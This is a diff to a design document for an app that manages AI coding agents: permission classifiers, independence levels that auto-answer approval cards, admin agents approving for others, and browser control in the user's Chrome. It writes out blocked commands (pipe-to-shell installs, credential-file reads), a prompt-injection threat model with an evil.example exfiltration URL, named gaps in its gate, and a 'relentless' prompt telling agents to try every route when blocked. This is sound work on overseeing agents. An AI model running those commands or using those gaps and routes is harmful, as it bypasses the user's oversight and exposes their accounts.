@@ -402,8 +402,18 @@ steps has no line.
   allowed: Run a command" / "You declined: …". "Edited n files" counts only
   edits that came back successful.
 - **Words, safe by construction**: `work::describe_tool` is the one table.
-  A command is only its program and subcommand ("Ran npm test", "Ran git
-  push", "Ran curl": never arguments, URLs or environment), a web page only
+  A command goes through `agents::describe`, which reads the shell (quotes,
+  redirections, here-documents, `&&`, pipes, loops, `bash -c`, wrappers)
+  and names what the line is for in plain words: "Running the Cypress
+  tests", "Looking up PR #248 on GitHub", "Getting the latest changes",
+  "Installing packages", "Reading 3 files", "Fetching localhost:3268",
+  "Looking up a PR on GitHub, 3 times". The only argument values it ever
+  shows are safe and telling: a PR or issue number, a web host (a local
+  one with its port), a script or file's own name, a count. Anything
+  unknown falls back to the program's name ("Running ffmpeg"), never raw
+  shell; `describe_tests.rs` holds the table. A line's headline is its
+  weightiest command (tests, then deploys and builds, installs, what goes
+  out to others, then the rest). A web page only
   its host ("Browsed acme.com"), a file only its name, someone else's MCP
   tool a verb and the service ("Searched Google Drive", "Sent from Gmail",
   "Worked in Chrome"), our own tools past-tense words ("Shared a file").
@@ -427,6 +437,42 @@ steps has no line.
   workspace), and every agent's offers **Take over** (below), as does the
   working line itself. Taking over a browser tab the agent drives is not
   built.
+- **The step it's on right now** (`work::LiveCall`, `AgentLiveStep`): from
+  the moment a call starts, the status's `work.current` carries its words,
+  when it started (the working line's live timer, "· 5:32"), whether it's a
+  known slow tool (`describe::Slow`: after a minute, a quiet "Test runs
+  usually take a few minutes"), and what it has printed so far, only
+  where the engine streams it (Codex's app server sends
+  `item/commandExecution/outputDelta`; Claude Code's stream-json carries
+  only `tool_progress` heartbeats, so its "Show output" says "Output
+  appears when it finishes"). Output lines are stripped of escapes, then
+  redacted and scrubbed like a label: the newest 20, sent at most once a
+  second. After ten minutes, **Stop this step** (`agents_stop_step`) ends
+  that command's process tree, found under the engine's pid by the start
+  of its command line (`liveness::needle`); the engine sees it end and the
+  turn carries on. Between calls the line says "Thinking".
+- **Finished steps keep their words** and add what was observed: how long
+  it took (`endedAt`, shown from 10s) and, for a test run, the counts the
+  runner printed ("Ran the Cypress tests · 6m 12s · 42 passed, 3 failed";
+  Jest, Vitest, Playwright, pytest, Mocha, Cypress's table, cargo). A
+  command that ran 20s or more, or failed, keeps its last 20 lines
+  (`output`, on the stored timeline only, never on the live status).
+- **Alive or stuck** (`work/liveness.rs`): every engine line is a sign of
+  life, and a sign of *progress* unless it's a heartbeat (Claude Code's
+  `tool_progress`). Every 15s the running command's processes are looked
+  up (`ps`, under the engine's pid); one using the CPU counts as progress
+  too. Shown only on demand: clicking the step reads "Last activity 4s ago
+  · using the CPU". With no progress for 3 min (6 for a slow tool),
+  `work.quietSince` is set and the working line reads "No progress for 5
+  min" with **Check on it** (`agents_check_on`: what the app can see now,
+  in one line; the engine can't be asked mid-call without interrupting
+  it, so it isn't) and **Stop**. A command whose process was seen and then
+  gone (or a zombie) for 2 min while the engine never reported it back
+  ends the turn with a line saying so (`HUNG_NOTE`).
+- **In the lists**: a working agent's row (sidebar, What's in flight)
+  says the step and how long ("Running the Cypress tests · 5m") or "No
+  progress for 5 min", never "Working…", and its badge's ring breathes
+  slowly in its colour (still under Reduce Motion).
 - **Stored** beside the log, never in it: `turns/<message-id>.json`, sent
   again on `agents://message` when the turn ends, and applied only to the
   paged chat reads (desktop and phone), after the log's lock is released,
@@ -667,22 +713,157 @@ independent your agents are…", and the phone's Settings
 (`agents.setIndependence`, audited; read from the overview's `independence`).
 Saved in `agents/independence.json`.
 
-It changes words, never the wall. The level is one short app-owned section of
-every agent's system prompt, built from code each turn (so existing and
-imported agents get it on their next turn, nothing in their CLAUDE.md is
-touched) and fixed per level (the prompt cache only breaks when the user
-changes it). Go hard tells an agent to finish what it was asked and, before
-asking the user to do anything, check whether they already asked for it and
-whether it has tried every way it has; it stops only for money, identity,
-sending or publishing as them, or deleting their data. No approval reads the
-level: every card appears at every level, and the only ways past one are
-still a one-time grant from a late Allow or an Always-allow rule the user
-chose (`mcp::decide`; a test holds it). Read-only commands already don't ask
-under `acceptEdits`, so no relaxation was added. A turn answering outside
-text (a "When…" routine's items, or anything carrying their taint through
-`message_agent` or a room) never runs at Go hard: it is capped at Use good
-judgement, so unattended routines still finish; the approval wall and the
-taint gate anything consequential.
+The level is one short app-owned section of every agent's system prompt,
+built from code each turn (so existing and imported agents get it on their
+next turn, nothing in their CLAUDE.md is touched) and fixed per level (the
+prompt cache only breaks when the user changes it). Go hard tells an agent to
+do what it was asked without asking at each step, stopping only for money,
+identity, sending or publishing as them, pushing, deleting their data or
+credentials. Go hard and Use good judgement both carry the "whatever it
+takes" block (`independence::RELENTLESS`): be relentless and resourceful;
+when blocked, try every route (its tools, the user's files and CLIs,
+connected apps, their signed-in Chrome, search, a small script, another
+agent) before asking; never stop at the first error or hand back work it can
+do; never end a turn silently unfinished, but finish or say exactly what's
+left and the one thing it needs.
+
+**Which cards it answers** (`agents/autoallow.rs`). `acceptEdits` still asks
+for a plain `ls -la ~/SomeFolder` outside the agent's folders, so a card per
+look was the norm even when the user had said "go hard". The level now also
+decides local cards, in `mcp::decide`, after a one-time grant and an Always
+allow rule and before a card, for Claude Code's permission prompt and Codex's
+approval requests alike (both arrive as the same `Bash` / `Edit` / `Read`
+calls):
+
+| Level | Answered without a card |
+|---|---|
+| Check with me often | nothing (as before) |
+| Use good judgement | reads |
+| Go hard | everything except its short ask list (`agents/go_hard.rs`) |
+
+**Go hard is allow-by-default** (after the owner's report that it still asked
+for nearly every step: worktrees, `npm ci`, dev servers in the background,
+`pkill`, copying `.env.local` between his projects, scripts on a page). It
+behaves like Claude Code's "do anything" mode and does not use the classifier
+below; it asks only for:
+
+- `git push` of any kind (force, deleting a remote branch), `git send-email`
+- `gh` acting as the user: `pr create|merge|review|comment|close|edit|ready`,
+  `issue create|comment|close|edit`, `release create|edit|delete`, `repo
+  create|delete|edit|rename|archive`, gist/workflow/secret/label writes, `gh
+  api` with a write method or fields
+- `npm`/`pnpm`/`yarn`/`bun` publish (and unpublish, deprecate, dist-tag)
+- deploys: `vercel` (bare, `deploy`, `--prod`, promote, alias, env add/rm),
+  `netlify deploy --prod`, `fly deploy`, `firebase deploy`, `wrangler
+  deploy|publish`, heroku/railway/surge releases
+- sending: `mail`, `sendmail`, `osascript` naming Mail / Messages / send,
+  Slack / Discord / Telegram / Signal / Twilio CLIs
+- Stripe with `--live` (except list/retrieve/logs)
+- `curl` / `wget` / `http` that write (a non-GET method, `-d`, `--data*`,
+  `-F`, `-T`, `--json`, httpie fields) to a host other than this Mac
+- `sudo`, `su`, `doas`; `rm -r` outside the user's projects (`~/ShipStudio`,
+  `~/Projects`, `~/Desktop/Projects`, `~/Developer`…, the projects root, any
+  git working copy below the home), the agents' homes and temporary folders,
+  and always for the home itself, `~/Library` and `/`
+- writes to `~/.ssh`, Keychains, shell profiles, `~/Library/LaunchAgents`,
+  the app's own data (another agent's home, this agent's log and
+  instructions), or outside the home and temporary folders; reading a
+  credential store (`~/.ssh`, Keychains, `~/.gnupg`); `crontab` (except `-l`),
+  `security`, `launchctl`, `diskutil`, `dd`, `csrutil`, `pmset`, `nvram` and
+  other system tools; `defaults write` to `-g` or a `/Library` domain
+- connector tools whose name writes (send, create, update, delete, pay…);
+  uploads in the browser
+
+Everything else runs: local git (commit, checkout, branch, worktree, merge,
+rebase, stash), builds, installs, dev servers, backgrounding, `pkill` /
+`kill`, copying `.env` files between projects, network reads, localhost
+requests (writes included), file work in the home. Command lines are split
+into every command they run, including quoted ones (`bash -c "git push"`) and
+those after `do`/`then`; `cd` is followed through the line. Relative paths
+are only judged for `rm -r` (against the turn's folder), because the engine's
+shell keeps its folder between calls. What it can't parse runs: the list is
+what has to be right, and `go_hard_tests.rs` holds every item on it and the
+owner's real commands (fictional paths).
+
+A turn answering outside text at Go hard keeps Go hard for local work and
+reading (reading a page is the job), and additionally asks for any network
+write (localhost included) and for running a package fetched by name (`npx
+pkg`, `npm i pkg`, `pnpm add`, `pip`/`brew`/`cargo`/`go install`, `curl … |
+sh`).
+
+The two lower levels use the allow-list classifier (`agents/autoallow.rs`):
+
+- **Reads**: read-only commands and file reads anywhere the user's account
+  can read (`ls`, `cat`, `grep -r`, `rg`, `find` without `-delete`/`-exec`,
+  `git status/log/diff/show…`, `gh pr/issue/repo … view/list/status`, `gh api`
+  GETs, `jq`, `defaults read`…), except credentials and private stores:
+  `~/Library/Keychains`, `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.config/gh`,
+  `~/.codex`, `~/.claude`, shell profiles, browser profiles, Mail, Messages,
+  the app's own data (every agent's home but this one's) and `~/.<slug>`, and
+  any `.env`, key, `*credential*`, `*secret*`, `*token*` or `*password*` file.
+  A recursive read of a folder that holds one of those (`grep -r x ~`) asks.
+- **Local work** (no level answers this class any more since Go hard became
+  allow-by-default; the admin agent's "local" answers still use it): creating, editing, moving, copying, linking,
+  `chmod` (no setuid) and unpacking inside the home, never into a shell
+  profile, `~/Library/LaunchAgents`, `~/Library/Preferences`, a PATH folder,
+  a protected place above, the agent's own log files, or any `.git` /
+  `.shipstudio` folder; deleting only folders the tools rebuild
+  (`node_modules`, `dist`, `build`, `.next`, `target`, `.cache`, and what is
+  inside them) in the agent's own home or its copy of a project — every other
+  delete asks, even there; the project's build, check and test
+  tools (`npm test`, `pnpm run build`, `cargo test`, `npx tsc`, `make test`…);
+  and scripts in the home whose text is read first: a shell script line by
+  line through the same classifier, other languages refused on sight of
+  anything that spawns, reaches the network, deletes or names a protected
+  place. That last check reads only the script, not what it imports (not
+  verified beyond that).
+  Also local work: `git fetch` / `git pull` (no helper programs or `ext::`
+  remotes), `curl` / `wget` GETs to http(s) with no body, form, upload or
+  config file; writing inside `/tmp`, `/private/tmp` and macOS's `$TMPDIR`;
+  installing *named* packages (`npm/pnpm/yarn/bun install|add|ci`, `pnpm
+  dlx`, `npx`/`uvx` of a named package, `pip`/`uv`/`pipx install`, `cargo
+  add|install`, `go get|install`, `brew install|upgrade`) — never global
+  (`-g`, `--prefix`, `--target`, `--break-system-packages`), never from a raw
+  address (`https://…`, `git+…`, `github:…`, a tarball); and anything on a
+  top-level folder this Mac doesn't have and this account can't make
+  (`/workspace/…`, Grok-era paths: it fails at once). Web searches and page
+  fetches (`WebSearch`, `WebFetch`, Codex's web search) are reads.
+- **Always a card, at every level** (`autoallow::ALWAYS_ASK` plus everything
+  unrecognised): `git push`, `commit`, `reset` and every other git write,
+  `gh` writes (`pr create|comment|review|merge|close|edit`, `release create`,
+  `gh api` with a non-GET method, fields without `-X GET`, `--input` or
+  `graphql`), `curl`/`wget` with a method other than GET/HEAD or a body,
+  other network tools, mail/Slack/hosting/cloud CLIs, `npm publish`,
+  installs from raw addresses or global ones, `curl … | sh`, `rm` / `trash`
+  of the user's files, `sudo`, `chown`, `chmod` on system paths, launch
+  agents and shell profiles, `security`, `osascript`, `open`, `kill`,
+  connector tools, payments, and Codex's "Allow more access" cards.
+- **Loops and variables**: `for NAME in …; do …; done`, `while`/`until`/`if`
+  and a line that only sets a variable (`RID=$(gh run list …)`) take the
+  class of the commands inside; a variable that changes how programs run
+  (`PATH`, `IFS`, `DYLD_*`, `GIT_*`, an exported name…) asks.
+- **Compound commands** are split into every command they run (`&&`, `||`,
+  `;`, `|`, `&`, line breaks, `$(…)`, backticks, `bash -c '…'`) and take the
+  class of the most dangerous part. Variables other than `$HOME`,
+  here-documents, subshells, `eval`, unknown programs and anything that
+  doesn't parse ask. Paths are judged as written and where they really are
+  (a symlink out of the home asks). When in doubt, a card.
+
+Each one answered this way leaves a step in the turn's "What it did"
+("Allowed automatically — Go hard · ls -la ~/SomeFolder"). A turn answering
+outside text (a "When…" routine's items, or anything carrying their taint
+through `message_agent` or a room) at Use good judgement stays there; at Go
+hard it keeps Go hard with the extra outside-text asks above (network
+writes, packages fetched by name).
+
+**Cards already open.** On launch and whenever the level changes,
+`mcp::sweep_auto_allowed` answers open permission cards the level now covers,
+with a receipt line in the chat ("Allowed automatically — Go hard · …"),
+through the same path as a late Allow (a waiter is woken; otherwise the exact
+call is granted once). Each new card records whether its turn answered
+outside text (`Approval.fromOutside`); a card without that record, or from
+such a turn, is judged at Use good judgement and doesn't wake its agent.
+Logins, secure input, session questions and import cards are never answered.
 
 ## Approvals
 
@@ -691,7 +872,8 @@ without asking. Anything else Claude Code would prompt for (a shell command
 that isn't read-only, a web fetch, an MCP tool like sending email, a file
 outside those folders) goes to `approve`, which puts a card in that agent's
 chat showing the exact command, file, URL or tool input, and waits for
-**Allow** or **Deny**. While it waits, the agent's row says "Needs your OK".
+**Allow** or **Deny**, unless the independence level answers it (local reads
+and, at Go hard, local work; see "How much agents do on their own"). While it waits, the agent's row says "Needs your OK".
 
 **What the broker trusts** (`agents/broker.rs`). Each turn gets an id, named
 by its secret, open until `run_turn` returns. An `approve` call with no
@@ -731,6 +913,19 @@ Two timeouts shape the design, both observed:
 - **300s**: Claude Code abandons a *permission prompt* at five minutes
   regardless of `MCP_TOOL_TIMEOUT` (two unanswered cards were both given up at
   exactly 300s, while their buttons still looked live).
+
+**Cards expire** (`agents/expiry.rs`; this supersedes the "stays live" and
+late-Allow behaviour below, which now only reaches a card from before it). A
+card whose turn ended, or that a restart left behind, closes at once as
+"Expired — the agent moved on". A card still blocking a turn closes when the
+wait runs out (240s for Claude Code, bounded by its 300s ceiling; the sweep
+closes anything past `CARD_EXPIRY_SECS`, 10 min): the call is denied with "No
+answer — ask again later if it still matters" and the agent is told to carry
+on without it or say what's left in one line. Sign-ins and secure input close
+after 10 min as "Maybe later". Each becomes a one-line receipt (desk and
+phone), counts in no badge, and the same ask (kind + target) is refused
+without a card for the rest of that task, until the user next writes to the
+agent. A sweep runs at launch and every minute.
 
 So approvals are asynchronous. `approve` waits 240s. If you haven't answered,
 it tells the agent "the user may be away: stop, say what you need, you'll be
@@ -776,6 +971,17 @@ agent with nothing of yours between says "2 of 3 similar requests" on each
 card, counted from the cards that have arrived, never from how many might
 follow (`approvalSeries`).
 
+**Allow all.** With more than one Allow card shown, the panel's head offers
+**Allow all**, and an agent's row with more than one offers its own. Either
+asks first on one confirm line with the counts by kind ("Allow 7 requests? 4
+commands, 2 file changes, Send an email · Gmail", or "Lead Gen: Allow 3
+requests? …"), then answers each card shown with Allow, one after another,
+through the same command as a single Allow (`allowAllCards` /
+`allowAllLine` in `lib/agentRequests.ts`). Login and secure input cards,
+session questions and import cards are never included, and cards further
+back in a chat (not shown) aren't answered. A card that fails stays waiting
+and the count is toasted. Desk only; the phone answers one card at a time.
+
 **Always allow** (`agents/permissions.rs`). A permission card can offer a
 quiet "Always allow …" beside Deny / Allow, scoped when the card is made and
 stored on it, so the UI can only accept that scope, never widen it: a Bash
@@ -795,6 +1001,83 @@ Adding a rule also answers every other open card from the same agent that it
 covers (`mcp::covered_by`), through the same path as Allow: a live waiter is
 woken, and a card nobody waits on any more gets a late Allow that wakes the
 agent.
+
+## Admins (`src-tauri/src/agents/admin.rs`)
+
+"All of the agents are begging me for something, I open them and I don't even
+know what they need." An **admin** is an agent the user lets manage, and
+answer for, the rest of the team.
+
+**Who.** One switch per agent, "Admin — can manage and approve for other
+agents": the agent editor, Settings → Agents → Admins (⌘K "Admins: who
+manages and approves for your team…"), and the phone's agent sheet
+(`agents.setAdmin`, audited). Kept as `admin` on the registry entry; absent
+means on for the Chief of Staff and off for everyone else. Only the user sets
+it: no tool takes it, and `create_agent` / `update_agent` refuse an `admin`
+argument. An existing Chief is told once, in a line in its chat ("I can now
+handle your team's requests — change this in Settings → Agents"); a Chief
+made by this build isn't.
+
+**What it may do** (tools served only to an admin, and checked again on every
+call, so turning it off holds from the next call):
+
+- `team_requests`: every other agent's waiting card, in plain words, with what
+  the admin may answer. Framed as data written by other agents.
+- `answer_request {agent, id, answer, note}`: allow or deny **local work**,
+  or mark a login / key card **not_needed** (declined, the agent isn't woken)
+  or **maybe_later** (closed with "Maybe later", not woken). Allow and deny go
+  through the same path as the user's own answer (`answer_card`): a waiting
+  turn is woken, a late Allow grants that exact call once.
+- `bring_to_user {requests, intro}`: ONE message in the admin's chat, "3
+  things only you can decide:", each card answerable in place for the agent
+  that asked (`AgentMessage.decide`; desk `DecideCards`, phone
+  `DecideCards`). On read the cards are refreshed from their own chats, and
+  the requests bar doesn't offer them twice.
+- `pause_agent` / `resume_agent`: stop what it's doing and pause its routines
+  (marked `pausedByAdmin`, so resume starts only those). Not the Chief.
+- Another agent's routines (`schedule_check_in` & co. with `agent`), and
+  `read_agent`.
+- `delete_agent`: a **soft delete**. The agent leaves the team at once; its
+  registry entry (whole) and home move to `recently-deleted/`, restorable from
+  Settings → Agents → Recently deleted for 30 days (`agents_restore`, which
+  adds " (restored)" if the name was taken). Its secrets, connections and copy
+  are kept until it's purged (`purge_expired`, when that list is read). It
+  leaves its rooms. The user's own Delete is unchanged.
+
+**What it may never do** (`classify_in`, `judge_in`, both pure and tested):
+local work is exactly what Go hard answers on its own (`autoallow::classify`:
+Read and Change). Without the asking agent's context, the narrower fallback:
+reading (`ls`, `cat`, `grep`, read-only `git`…), `mkdir` /
+`touch`, Read, and Write of a *new* file under the home folder. Anything with
+a hidden path (`.env`, `~/.ssh`), a chain, `rm`, `git push`, `gh`,
+`curl`/`ssh`, `sudo`, `security`, publish/deploy, Edit of an existing file,
+the web, any connector tool, the app's own questions, a session's question,
+an import card, or any card from an agent whose turn answers outside text is
+the user's. So are keys and logins, which an admin can only put away. An
+admin can't answer its own requests. A turn answering outside text (a
+"When…" routine, an import, a room's taint) is not an admin turn: its tools
+aren't listed and every call is refused.
+
+**Nothing invisible.** Each answer leaves a line in the target's chat ("Chief
+of Staff allowed: look inside your KiteExport folder") and the admin's
+("Allowed for Ledger: …"), each naming the other, and an entry in Settings →
+Agents → Admin activity (`admin-activity.jsonl`, last 500).
+
+**Plain words on every card.** A permission card leads with what it does and
+why, from the tool and its input (`summary_for`: "Look inside your KiteExport
+folder — to see if the download finished"), with the raw command behind
+Details, on the desk, the review panel, the requests bar's line and the
+phone. The why is the command's `description` (agents are told to always give
+one) or the engine's own reason. Cards made before this get their line when
+read (`admin::apply`).
+
+**Not verified.** No live engine turn has called these tools; the rules are
+held by unit tests (`admin_tests.rs`) and the UI by the harness
+(`agents-admin-batch`, `settings-agents-admins`) and the phone's `qa:web`
+(`chat-chief`). Local work is Go hard's own classifier
+(`autoallow::classify`, Read and Change) with the asking agent's context;
+`local_call` is only the fallback without one. "Maybe later" here closes the
+card rather than using the access chain's checklist.
 
 ## Secrets (`src-tauri/src/agents/secrets.rs`)
 
@@ -853,12 +1136,12 @@ to do (read; and, when `scopes` asks for more, send/post/change, which
 
 | Tier | Way in | Where the sign-in is kept | Engines |
 | --- | --- | --- | --- |
-| 1 | **Use \<account>**: an account already connected for another agent | as below | as below |
+| 1 | **Use \<account>**: an account already connected (ours) for another agent | as below | as below |
 | 1 | **Connect** (ours, `oauth.rs`): the app's own OAuth in the Mac's browser | this Mac's Keychain, `<slug>-connection-<id>` | both |
-| 1 | **Connect in Claude instead** (claude.ai connector; for Gmail, Calendar, Drive and Slack it comes *after* Use my browser, which leads, since the owner's connectors weren't being recognised): "Connect Gmail in Claude: it opens Claude's connectors page; turn on Gmail, then come back." Opens Claude's connectors page in the Mac's browser if it isn't added yet; the card watches `claude mcp list` (every 20 s, and at once when the window or the phone app comes back, `agents_logins_recheck`) and turns ✓ by itself | claude.ai | Claude Code |
 | 1 | **Use GitHub on this Mac**: the `gh` sign-in | `gh`'s own Keychain item | both |
-| 2 | **Use my browser**: Claude in Chrome, in the user's own Chrome where they're signed in; every click/post/send/pay asks | nowhere new | Claude Code |
-| 3 | **Enter an API key**: the masked field (`secrets.rs`), only where a key made for programs is a real way in (X API, Stripe restricted key, an app we don't know) | this Mac's Keychain | both |
+| 2 | **Use my browser**: Claude in Chrome, in the user's own Chrome where they're signed in; every click/post/send/pay asks. The default for every service without our own OAuth (Gmail, Calendar, Drive, Slack, LinkedIn, X…) | nowhere new | Claude Code |
+| 3 | **Connect in Claude instead** (optional, after the browser): "Connect Gmail in Claude: it opens Claude's connectors page; turn on Gmail, then come back." Opens Claude's connectors page (Customize → Connectors, below) in the Mac's browser if it isn't added yet; the card watches `claude mcp list` (every 20 s, and at once when the window or the phone app comes back, `agents_logins_recheck`) until it's connected. If it doesn't, the card says to use the browser instead: never a dead end. A claude.ai connection made for another agent sits here too | claude.ai | Claude Code |
+| 4 | **Enter an API key**: the masked field (`secrets.rs`), only where a key made for programs is a real way in (X API, Stripe restricted key, an app we don't know) | this Mac's Keychain | both |
 
 A service with no connector says so in one line on the card ("LinkedIn has
 no connector agents can sign in to."), instead of a password field. A Codex
@@ -923,7 +1206,182 @@ Commands: `agents_login_not_needed`, `agents_logins_not_needed(keys?)`,
 `agents.loginNotNeeded`, `agents.loginsNotNeeded`, `agents.loginsUndecline`
 (additive: an older Mac doesn't list them and the phone doesn't offer them).
 The per-agent action on a row is now **Skip** (`agents_login_dismiss`: that
-agent's card only).
+agent's card). The access chain counts both as a no (below, "Just try
+first", step 1): the team-wide list feeds its "Not needed" keys, and turning
+an app back on records when (`turnedOn` in the same file), so a no on a card
+from before then stops counting.
+
+### Just try first (`agents/access_chain.rs`)
+
+Answers: **does an agent get on with the job instead of asking for a login?**
+"Go do this in Figma" means: look for Figma access, else use the user's
+signed-in browser and say which account it's in, and ask only if both fail.
+
+`request_login` runs the chain on the Mac before any card, per task:
+
+1. **Said no already**, for anyone on the team (declined, or "Not needed",
+   on a card or on the setup checklist, kept after the checklist is put
+   away): never asked again; the agent carries on without it. A service the
+   catalogue doesn't know matches however it's spelled ("Acme CRM",
+   "acme-crm").
+2. **Granted already**: one of our own working connections (OAuth, `gh`).
+   A claude.ai connector doesn't count (it isn't always recognised in a
+   turn): it's an optional extra after the browser, never the default.
+3. **This Mac is signed in**: GitHub through `gh` (granted silently: the
+   agent could run `gh` anyway, and every change asks through the broker).
+4. **The user's browser**, when this turn has it (below) and the service has
+   a site: the site is added to the agent's `browser_sites` and it's told to
+   open it in a new tab and say "I'm in Figma as …" from what the page shows,
+   never a guess. A sign-in page sends it back with `signed_out: true`.
+5. **Someone's card for it is waiting**: the agent joins that card
+   (`login-waiters.json`; the card shows "Also for …") and gets the same
+   answer, never more access than the card allowed.
+6. **One at a time**: an agent with a sign-in card waiting can't raise another.
+7. Only then one card, whose first way in is a sign-in button; a key field
+   only where the service has nothing else.
+
+Every agent's `## Getting access` rules, the Chief's instructions (upgraded
+by `PAST_CHIEF_INSTRUCTIONS`) and an imported agent's "Where you are now"
+logins bullet (upgraded in place by exact match, `arrival::PAST_LOGINS_LINES`)
+say the same: try the chain, ask only when blocked on the user's actual task,
+never up front, one thing at a time, never a password or token in chat.
+
+A connection someone else has (not this agent) still needs a one-tap "Use
+\<account>" card: per-agent grants stay the wall for connectors.
+
+### Your browser (`agents/browser.rs`)
+
+The mechanism is Claude Code's **Claude in Chrome**: `claude --chrome` loads
+the `claude-in-chrome` MCP server into a turn, which drives the Claude in
+Chrome extension in the user's own Chrome (open tabs, navigate, read text or
+the accessibility tree, screenshots, click, type, fill forms). The extension
+must be signed in to the **same claude.ai account** as Claude Code, and Claude
+Code must be signed in with claude.ai (an API key keeps it off). Codex has no
+equivalent here: Codex agents never get the browser and ask instead.
+
+**Set up once, checked by the app.** ⌘K "Let agents use your browser…", the
+setup checklist and "What it can reach" open one guided card: Claude Code
+signed in (`claude auth status`), the extension in a Chrome profile, and a
+browser answering. The last is asked of `claude --claude-in-chrome-mcp`
+(the same server, over stdio) with `list_connected_browsers`: no model turn,
+nothing opened. That flag isn't in `--help`; verified on 2.1.318. **Turn on**
+only works once a browser answers. Teams whose user chose "Use my browser" on
+a login card in an older build start switched on.
+
+**Who gets it.** A turn runs `--chrome` only when the team's switch is on, the
+agent's own isn't off, it runs on Claude Code, and the turn doesn't answer
+outside text (a "When…" routine's items, or a message carrying that taint
+through `message_agent` or a room): those run `--no-chrome`, and the broker
+refuses any browser call they make anyway.
+
+**What asks** (`agents/browser_gate.rs`, before Always-allow rules). The one
+place the independence level changes an approval, and only for the browser:
+
+- **Looking never asks** at "Use good judgement" and "Go hard": tabs, browsers
+  and profiles, `navigate` / a new tab to *any* `http(s)` page, `read_page`,
+  `get_page_text`, `find`, screenshots, zoom, scroll, hover, wait, the console
+  and network, resizing, recording a GIF. Other schemes (`javascript:`,
+  `file:`, `chrome:`) ask. At "Check with me often" only the agent's own
+  `browser_sites` are free to open, and a URL carrying another URL (`//` after
+  the host, plain or percent-encoded) asks.
+- **Acting goes through unless it sends**, at "Use good judgement" and "Go
+  hard": a click, keystroke, form fill or batch asks only when the control's
+  accessible name (what `read_page` / `find` answered for that `ref`, kept per
+  agent from the stream: `browser_gate::observe`) is a send / post / publish /
+  pay / buy / order / delete / remove / share / invite / submit / confirm /
+  merge / deploy word (whole words: "Posts" and "Sign in" don't count), when
+  Enter is pressed anywhere but a search box (or nobody knows where the cursor
+  is), or when the page is a payment host or a checkout / cart / billing /
+  compose / transfer page. A click by coordinate can't be named, so it goes
+  through except on those pages: **an accepted gap**, as is a navigation
+  carrying data in its own URL to a site the agent chose. At "Check with me
+  often" every interaction asks.
+- **Always a card** below Go hard: `javascript_tool`, `file_upload`,
+  `upload_image`, `shortcuts_execute`, a GIF export and any tool this build
+  doesn't know.
+- **At Go hard everything runs**, `javascript_tool`, shortcuts and unknown
+  tools included, except send-like clicks and keys (above), `file_upload` /
+  `upload_image`, a GIF export, and a script that submits or sends
+  (`go_hard::script_sends`): `.submit(` / `requestSubmit`, `sendBeacon`, a
+  form's `action` changed, `fetch` / XHR with a write method or a body, jQuery
+  / axios writes, or a click / Enter where a string in the script names a
+  send-like control (`Send`, `…submit-button`, `type=submit`). A script that
+  reads the page or clicks "See more" runs.
+
+A browser card says what it would do in plain words ("Click “Send” on
+mail.google.com", "This would send it as you"), then what it types or fills and where and as whom (`browser::card_for`: the site last opened and the account found there, `browser_profiles`), with the raw call behind
+Details. Allowed steps leave only their line in "What it did". At launch every
+pending browser card expires with the rest (its turn is gone); when the user
+changes the level, an open browser card whose turn is still waiting and that
+the browser gate now lets through is allowed with a receipt
+(`mcp::sweep_auto_allowed`). Turns answering outside text still never get the browser.
+`browser_sites` only ever holds a catalogue service's built-in host
+(`logins::SERVICES`): the access chain, a login card's "Use my browser" and
+the reach check add one; nothing an agent or an import types becomes a site.
+
+**Which Chrome profile** (`agents/browser_profiles.rs`). The extension can sit
+in more than one Chrome profile, each signed in as someone else. When the
+chain hands an agent the browser, the app lists the connected browsers itself
+(`list_connected_browsers`, nothing opened) and tells the agent where to
+start: the profile this site was last found in, the only one, or each in
+turn. The agent opens the site, reads which account it shows, and moves with
+`select_browser` / `switch_browser` (looks, no card) when it's the wrong one.
+With no other profile connected it calls `ask_bring_browser_to_front`: one
+plain card, "Bring your sam@work Chrome window to the front so I can use it",
+Check again / Not now, never a login ask, joined team-wide like a login card.
+`remember_browser_account` keeps site → profile and account in app data
+(`browser-accounts.json`, only for the agent's own sites, never from outside
+text), shown with Forget under "What it can reach". The extension's own
+per-site permission prompt is left as it is. **Partly verified:** on the Mac
+this was built on the extension was in two profiles but only one browser
+("Browser 1") was connected at a time, so switching between two connected
+profiles hasn't been seen working, and the answer's shape is read leniently
+(`parse_browsers`).
+
+**Threat model.** The agent acts as the user, in sessions the user is signed
+in to. The risk is a page's own text (an email, a doc, a profile) telling the
+agent to do something: prompt injection. What stands against it:
+- Anything that acts on a page asks on a card, so an injected "send this",
+  "delete that" or "share with x@y" reaches the user as a request.
+- Navigation outside the agent's sites asks, so an injected "open
+  https://evil.example/?q=<what you read>" can't carry data out silently.
+  (A read-only page could still show text the agent repeats in chat; that
+  stays on this Mac.)
+- Text from outside never drives the browser (`--no-chrome` + refusal; a
+  turn with no reach worked out runs `--no-chrome` too). Nor does it get
+  anything granted through the access chain: such a turn skips the silent
+  `gh` grant and the browser step and never joins another agent's card (whose
+  answer would grant it); it ends on its own card.
+- Passwords are never typed: the rules say stop at a sign-in page.
+- The user can take it away per agent, or switch the team's off.
+Not covered: the extension's own per-site permissions are the user's to set
+in Chrome; a site the agent was given can still be read in full once open.
+
+### Checking what your team can already reach (`agents/access_check.rs`)
+
+An import used to put a card in every imported agent's chat for every login
+it had used elsewhere. Now nothing is asked up front: an imported agent's
+logins become **Maybe later** rows on "Setting up your team", one per service
+team-wide, and the app checks them itself straight after the import (and from
+⌘K "Check what your team can already reach" or the step's Check again), in
+order and read-only: one of our own connections already made; this Mac's
+sign-ins (`gh`, `vercel whoami`); once the team's browser is on, the
+service's account page opened in a new tab, looked at (did it land on a
+sign-in page?) and closed; and last, as an extra, an app in Claude Code
+(`claude mcp list`: a claude.ai connector or the user's own server). Only services someone mentioned are opened; no
+click, no typing; nothing kept beyond the service, how it was reached and an
+account name a connection or CLI reported.
+
+A reached row closes with a receipt ("Figma: your browser, signed in on
+www.figma.com"); for the browser, the agents that mentioned it get the site.
+The Logins step shows only the residue ("Your team is ready. 3 things I
+couldn't reach on this Mac"), each with one sign-in button that raises one
+quiet card and starts its best way in at once (others join it), or "Get your
+key"/"Add a key" when a key is all there is, and Not needed. Progress is one
+line on desk and phone ("Checking 14 services… Figma ✓ GitHub ✓"). Only the
+app starts it: there's no agent tool for it. Quiet import cards an older build
+raised are folded into rows at launch (`team_setup::fold_cards`), each closed
+with a line saying so.
 
 ### Which services have a real connector (checked 2026-11)
 
@@ -1013,6 +1471,95 @@ Deny declines.
   sheet hands its redirect back to the app that opened it; a forged
   redirect fails `state`. A team row signed in on the phone grants the
   row's other agents the same connection once it's in (`fan_out`).
+
